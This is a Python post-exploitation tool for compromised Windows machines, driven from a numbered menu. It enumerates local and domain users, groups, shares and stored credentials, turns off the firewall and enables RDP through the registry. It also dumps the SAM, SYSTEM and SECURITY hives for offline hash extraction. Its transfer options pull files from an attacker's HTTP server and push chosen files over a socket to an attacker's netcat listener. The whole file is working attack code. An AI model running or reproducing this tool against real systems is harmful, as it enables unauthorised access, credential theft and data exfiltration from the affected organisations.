import subprocess
import sys
import os
import socket

sys.stdout = open(sys.stdout.fileno(), mode='w', encoding='utf-8', buffering=1)

os.system('chcp 65001 > nul')


def banner():
    banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀                                  +##-                                           
                                -+#####                                          
                              +##++##+#+                                         
                            .----+######                                         
                                  +-###+                                         
                         .+###+#+-  -+##                                         
                       .######+#####  +++    +#                                  
                      +##+  ###  #+##  ++                                        
                  .- .##+   ###   #+##  ++        #-                             
                +#+  #+.   +###-    ##. ++    -.#.  --                           
               +#+        +####+-     +  --                                      
               #++  +#  #########+-  +.  -+    #-                                
              .#++    ##++## + ##+###    --      .                               
               #++     .###########      -.                                      
                ++      ##+-   ###       +                                       
                 .       #-     #-       +                                       
                         #-     #        +-  --.                                 
                          #    -.       .+#   #####+.                            
                          -    +        .##   .+#####.                           
                           +  .         +#. - ++###++#                           
                           +  .       . -#    ##+###-#-                          
                            ++       +  ++ +  +#+++-+.+                          
                                   .#  +-  . +-+###.- -                          
                                 #+--  -     #####+#                             
                                  ++  .-    ##+-##.                              
                                     ..    ##. #                                 
                                          +.                                     
                                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	"""
    print(banner)


def help():
    print("[1] - Enum local users\n"
          "[2] - Enum local groups\n"
          "[3] - Enum All Domain users\n"
          "[4] - Enum all Domain groups\n"
          "[5] - Show RDP sessions\n"
          "[6] - Check Privileges\n"
          "[7] - Get Domain name\n"
          "[8] - Arp Table\n"
          "[9] - Get PCs in Domain\n"
          "[10] - Get Password Policies\n"
          "[11] - List Credentials\n"
          "[12] - Avaliable routes\n"
          "[13] - DNS Info\n"
          "[14] - Current groups\n"
          "[15] - Firewall Info\n"
          "[16] - Firewall Config\n"
          "[17] - Turn off firewall\n"
          "[18] - Open RDP port\n"
          "[19] - List all computers shares\n"
          "[20] - Current Shares\n"
          "[21] (IP) (Port) (File)  - Infiltration | Attacker: python3 -m http.server (Port) \n"
          "[22] (IP) (Port) (File) - Exfiltration | Attacker: nc -lvp (Port) > File_name \n"
          "[23] Credential Dump registry - [!] Need Privileges ")


def main():
    banner()
    while True:
        print('"help" to open help menu')

        while True:
            user_input = sys.argv[1]

            if user_input == 'help':
                help()
                return

            elif user_input == '1':
                result = subprocess.run('net user', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nLocal Users:")
                print(result.stdout)
                return
            elif user_input == '2':
                result = subprocess.run('net localgroup', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nLocal groups:")
                print(result.stdout)
                return
            elif user_input == '3':
                result = subprocess.run('net user /domain', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nDomain Users:")
                print(result.stdout)
                return
            elif user_input == '4':
                result = subprocess.run('net group /domain', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nDomain Groups:")
                print(result.stdout)
                return
            elif user_input == '5':
                result = subprocess.run('qwinsta', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nRDP Sessions:")
                print(result.stdout)
                return
            elif user_input == '6':
                result = subprocess.run('whoami /priv', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nPrivileges:")
                print(result.stdout)
                return
            elif user_input == '7':
                result = subprocess.run('echo %USERDOMAIN%', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nDomain:")
                print(result.stdout)
                return
            elif user_input == '8':
                result = subprocess.run('arp -A', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nArp Table:")
                print(result.stdout)
                return
            elif user_input == '9':
                result = subprocess.run('net view /domain', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nAll PCs in Domain:")
                print(result.stdout)
                return
            elif user_input == '10':
                result = subprocess.run('net accounts', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nPassword Policies:")
                print(result.stdout)
                return
            elif user_input == '11':
                result = subprocess.run('cmdkey /list', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nList Credentials:")
                print(result.stdout)
                return
            elif user_input == '12':
                result = subprocess.run('route print', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nAvaliable routes:")
                print(result.stdout)
                return
            elif user_input == '13':
                result = subprocess.run('type C:\WINDOWS\System32\drivers\etc\hosts', shell=True, capture_output=True,
                                        text=True)
                print("-" * 80 + "\nDNS info:")
                print(result.stdout)
                return
            elif user_input == '14':
                result = subprocess.run('whoami /groups', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nCurrent User Group:")
                print(result.stdout)
                return
            elif user_input == '15':
                result = subprocess.run('netsh firewall show state', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nFirewall info:")
                print(result.stdout)
                return
            elif user_input == '16':
                result = subprocess.run('netsh firewall show config', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nFirewall Config:")
                print(result.stdout)
                return
            elif user_input == '17':
                result = subprocess.run('netsh advfirewall set currentprofile state off', shell=True,
                                        capture_output=True, text=True)
                print("-" * 80 + "\nTurn off firewall:")
                print(result.stdout)
                return
            elif user_input == '18':
                result = subprocess.run(
                    'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                    shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nOpening RDP port:")
                print(result.stdout)
                return
            elif user_input == '19':
                result = subprocess.run('net view \\\\computer /ALL', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nAll Computer Shares:")
                print(result.stdout)
                return
            elif user_input == '20':
                result = subprocess.run('net share', shell=True, capture_output=True, text=True)
                print("-" * 80 + "\nCurrent Shares:")
                print(result.stdout)
                return
            elif user_input == '21':
                import time
                def infiltration_transfer():
                    import requests
                    url = f"http://{sys.argv[2]}:{int(sys.argv[3])}/{sys.argv[4]}"
                    file = f"{sys.argv[4]}"
                    try:
                        response = requests.get(url)
                        if response.status_code == 200:
                            with open(file, "wb") as local_file:
                                local_file.write(response.content)
                            print(f"File: {sys.argv[4]}\nIP: {sys.argv[2]}\nPort: {sys.argv[3]}")
                            exit(0)
                    except Exception as error:
                        print(f"\033Error: {error}")
                        exit(0)




                infiltration_transfer()
                print("-" * 80 + "\nDownloading file...")
                time.sleep(3)


            elif user_input == '22':
                import time
                def exfiltration_transfer():
                    host, port = f"{sys.argv[2]}", int(sys.argv[3])
                    client_socket = socket.socket()
                    try:
                        client_socket.connect((host, port))
                    except Exception as error:
                        print(f"[*] Error: {error}")
                        exit(0)

                    with open(f"{sys.argv[4]}", "rb") as file:
                        while True:
                            data = file.read(1024)
                            if not data:
                                break
                            client_socket.send(data)

                print("-" * 80 + "\nExfiltrating file wait...")
                time.sleep(3)
                print(f"File: {sys.argv[4]}\nIP: {sys.argv[2]}\nPort: {sys.argv[3]}")
                exfiltration_transfer()
                exit()
            elif user_input == '23':
                try:
                    print("-" * 80 + "\nDumping SAM and SYSTEM...")
                    subprocess.check_call("reg save HKLM\\sam sam", shell=True)
                    print("Saving sam...")
                    subprocess.check_call("reg save HKLM\\system system", shell=True)
                    print("Saving system")
                    subprocess.check_call("reg save HKLM\security security", shell=True)
                    print("Saving security")
                    print('Exfiltrate it and use "impacket-secretsdump -sam sam -security security -system system LOCAL"')
                    exit(0)
                except Exception as error:
                    exit(0)

            else:
                print("Invalid Option!")
                exit(0)


main()
